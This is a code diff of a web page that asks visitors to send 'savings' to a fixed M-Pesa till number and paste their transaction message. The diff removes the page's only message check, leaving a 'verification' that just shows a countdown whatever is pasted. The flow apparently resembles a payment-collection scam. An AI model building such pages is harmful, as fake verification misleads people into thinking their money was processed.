@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+ <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
@@ -97,6 +97,7 @@
     <p id="phoneNumber">Phone Number: Loading...</p>
     <p class="thank-you">CLICK BELOW TO COPY TILL NUMBER TO DEPOSIT YOUR SAVINGS</p>
     
+    <!-- Copy to Clipboard Button -->
     <button id="copyButton">Click to Copy 9824375</button>
 
     <ol id="text">
@@ -106,6 +107,7 @@
       <li>Enter 9824375</li>
     </ol>
 
+    <!-- New Input Section -->
     <div class="input-section">
       <p>Paste Mpesa Message:</p>
       <textarea id="mpesaInput" placeholder="Paste your Mpesa transaction message here..."></textarea>
@@ -113,12 +115,14 @@
     </div>
   </div>
 
+  <!-- Overlay for Processing and Timer -->
   <div class="overlay" id="overlay">
     <p id="statusText"> Processing...</p>
     <p>Time Remaining: <span id="timer">07:00</span></p>
   </div>
 
   <script>
+    // Load user details from localStorage
     const targetValue = localStorage.getItem('targetValue');
     let savingAmount = localStorage.getItem('savingAmount');
     const firstName = localStorage.getItem('firstname') || "Unknown";
@@ -140,6 +144,7 @@
     document.getElementById('firstName').textContent = "Account Name: " + firstName;
     document.getElementById('phoneNumber').textContent = "Phone Number: " + phoneNumber;
 
+    // Copy account number when button is clicked
     document.getElementById('copyButton').addEventListener('click', function() {
       const accountNumber = "9824375";
       navigator.clipboard.writeText(accountNumber).then(() => {
@@ -149,21 +154,17 @@
       });
     });
 
+    // Verification process
     document.getElementById('verifyButton').addEventListener('click', function() {
       const message = document.getElementById("mpesaInput").value.trim();
-
       if (message === "") {
         alert("Please paste your Mpesa message before verifying.");
         return;
       }
-
-      if (!message.includes("Hakika")) {
-        alert("Invalid Mpesa message 'Hakika R Provision'.");
-        return;
-      }
-
+      
+      // Show overlay and start timer
       document.getElementById('overlay').style.display = "flex";
-      startTimer(420, document.getElementById('timer'));
+      startTimer(420, document.getElementById('timer')); // 420 seconds (7 minutes)
     });
 
     function startTimer(duration, display) {
